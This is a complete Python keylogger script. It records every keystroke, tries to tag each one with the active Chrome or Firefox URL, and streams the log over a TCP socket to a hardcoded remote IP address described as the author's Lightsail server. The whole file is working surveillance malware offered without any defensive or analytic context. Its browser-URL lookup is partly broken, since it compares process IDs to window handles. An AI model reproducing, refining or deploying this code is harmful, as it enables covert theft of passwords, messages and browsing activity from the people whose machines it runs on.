import os
import socket
import logging
from pynput.keyboard import Key, Listener
import psutil
import pygetwindow as gw
import subprocess

# Server settings
SERVER_IP = '18.215.152.142'  # Your Lightsail public IP address
SERVER_PORT = 9999            # Change to your preferred port

sock = None

def connect_to_server():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_IP, SERVER_PORT))
        print("Connected to server")
    except Exception as e:
        print(f"Failed to connect to server: {e}")
        sock = None

def send_to_server(data):
    if sock:
        try:
            sock.sendall(data.encode())
            print("Data sent: ", data)
        except Exception as e:
            print(f"Failed to send data: {e}")

def get_active_window_title():
    window = gw.getActiveWindow()
    if window:
        return window.title
    return None

def get_browser_url():
    active_window = get_active_window_title()
    if not active_window:
        return None

    # Check if the active window is a web browser
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        if proc.info['name'] in ['chrome.exe', 'firefox.exe']:
            if proc.info['pid'] == gw.getActiveWindow()._hWnd:
                if proc.info['name'] == 'chrome.exe':
                    # For Chrome
                    return get_chrome_url()
                elif proc.info['name'] == 'firefox.exe':
                    # For Firefox
                    return get_firefox_url()
    return None

def get_chrome_url():
    try:
        result = subprocess.check_output(['powershell', '-Command', """
        $chrome = (Get-Process chrome -ErrorAction SilentlyContinue)
        if ($chrome) {
            $output = (Get-Process chrome | foreach {
                $url = $_.MainWindowTitle
                if ($url -like "http*") { $url }
            }) -join "`n"
            echo $output
        }
        """])
        return result.decode().strip()
    except Exception as e:
        print(f"Failed to get Chrome URL: {e}")
        return None

def get_firefox_url():
    try:
        result = subprocess.check_output(['powershell', '-Command', """
        $firefox = (Get-Process firefox -ErrorAction SilentlyContinue)
        if ($firefox) {
            $output = (Get-Process firefox | foreach {
                $url = $_.MainWindowTitle
                if ($url -like "http*") { $url }
            }) -join "`n"
            echo $output
        }
        """])
        return result.decode().strip()
    except Exception as e:
        print(f"Failed to get Firefox URL: {e}")
        return None

def on_press(key):
    try:
        log = f'Key pressed: {key.char}'
    except AttributeError:
        log = f'Special key pressed: {key}'
    url = get_browser_url()
    if url:
        log = f'{log} (URL: {url})'
    send_to_server(log)

def on_release(key):
    if key == Key.esc:
        if sock:
            sock.close()
        return False

if __name__ == "__main__":
    connect_to_server()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
